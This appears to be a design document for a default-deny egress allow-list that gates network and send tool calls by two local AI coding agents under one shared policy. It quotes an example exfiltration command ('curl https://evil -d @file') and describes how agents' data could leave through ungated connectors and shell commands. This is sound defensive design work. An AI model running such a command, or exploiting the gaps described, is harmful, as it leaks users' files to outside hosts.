# Design & Architecture

A single control that adds destination-aware egress enforcement to **both** local agents
(Claude Code and Codex) from one shared policy. This doc explains *why* the control exists
and *how* it is built. For the frozen allow-list model and the per-mode rules, see
[THREAT-MODEL.md](THREAT-MODEL.md).

## Why: the gap this closes

Two agents, one machine, shared state, and **no egress destination control on either**.

- **Claude Code** gated MCP tool calls for a few high-risk categories but had **no
  destination allow-list**: a `browser_navigate` / fetch to an arbitrary host, an
  unrecognized connector, or a shell `curl` to any host all passed. Anything the agent could
  name, it could reach.
- **Codex** ran its tool dispatcher with a denylist for destructive commands, but network
  verbs were excluded (a plain `curl https://evil -d @file` was allowed **even in a
  read-only turn**) and account connectors (`mcp__codex_apps__*`) reached the hook with no
  rule, returning *allow*. A connector send to an arbitrary backend went ungated.
- **Shared-state laundering.** Both agents touch the same files and state but shared no egress
  policy, so the **weaker** lane set the blast radius for both.

The unifying fix is one **default-deny egress allow-list**, enforced at each agent's existing
PreToolUse choke point, driven by a single shared policy file. Network/send-class tools must
name an allow-listed destination; everything else is unaffected.

## System overview

```
tool call ─▶ PreToolUse hook ─▶ egress classifier ─▶ destination extracted from tool_input / command
                                      │                         │
                                      │                         ▼
                                      │              match against the shared allow-list
                                      ▼                         │
                              non-network tool            in list ─▶ allow + audit
                              ─▶ existing logic            not in list ─▶ DENY + audit
                                                           novel host + payload > size cap ─▶ DENY
```

The classifier is **additive**: non-network tools fall through to the agent's existing logic
unchanged. Only network/send-class tools take the new default-deny destination check.

## Classification: four modes, checked in order

1. **URL-host**: tools that carry an explicit URL. Allowed iff every extracted host is in
   `allow_hosts`; deceptive hosts are normalized to their true host first; no host ⇒ deny.
2. **Connector-class**: fixed-backend connectors (no URL in payload). Allowed iff the full
   tool name matches an `allow_connectors` glob; unknown/renamed ⇒ deny. Optional
   `connector_owner_scope` restricts a connector to allow-listed resource owners.
3. **Generic-network catch-all**: a tool whose name signals network/send behavior but matches
   neither mode above ⇒ fail-closed deny unless its server is local (`non_egress_servers`).
4. **Unknown tool carrying a `scheme://host` payload** ⇒ fail-closed deny.

The shell hook applies the same `allow_hosts` to `curl`/`wget`/`ssh`, and owner/host-scopes
`git push` / `gh` **writes** (reads are never gated, local data can't leave without hitting an
already-gated send). See [THREAT-MODEL.md](THREAT-MODEL.md) for the exact rules and the
threat-gap → verifier traceability.

## Data model: the policy

A single JSON file (`mcp-gate-policy.json`) is the source of truth. It contains **hostnames
and tool-name globs only, no secrets, no tokens**. See
[policy/mcp-gate-policy.example.json](../policy/mcp-gate-policy.example.json) for the full
schema with inline documentation. Key properties:

- `egress.default = "deny"` applies **only** to tools matching a network mode; all other
  tools keep default-allow.
- Empty `allow_hosts` / `allow_connectors` arrays are fail-closed by construction (nothing
  matches → deny).
- Policy writes should be atomic (`jq > tmp && mv`) so a partial read is invalid-JSON →
  fail-closed, never a half-applied allow-list.

## Cross-provider parity

Both agents read the **same** `mcp-gate-policy.json` `egress` block. Neither embeds a
divergent hardcoded host list in its enforcement code, so drift between the two is
structurally impossible, and "diff the two allow-lists is empty" is trivially satisfied.
Each consumer **fails closed** if the file is absent, unreadable, not valid JSON, missing the
`egress` key, or missing `egress.default`. `tests/parity-check.sh` asserts both surfaces
consume the same keys and embed no divergent literal.

## Scope boundaries

**In scope:** destination-aware egress allow-listing + default-deny for network/send-class
tools on both agents; connector owner-scoping; git/`gh` write owner+host scoping; shell
`curl`/`wget`/`ssh` host-checking; kill-switch hardening on the Codex side; deterministic
verifier coverage.

**Out of scope (see [LIMITATIONS.md](../LIMITATIONS.md)):** output-side taint tracking /
read→exfil correlation; decode-aware payload inspection; per-connector scoped credentials;
prompt-injection carried in tool output (egress control is input-side). These are inherent to
an input-side hook-layer control and are documented honestly rather than implied away.
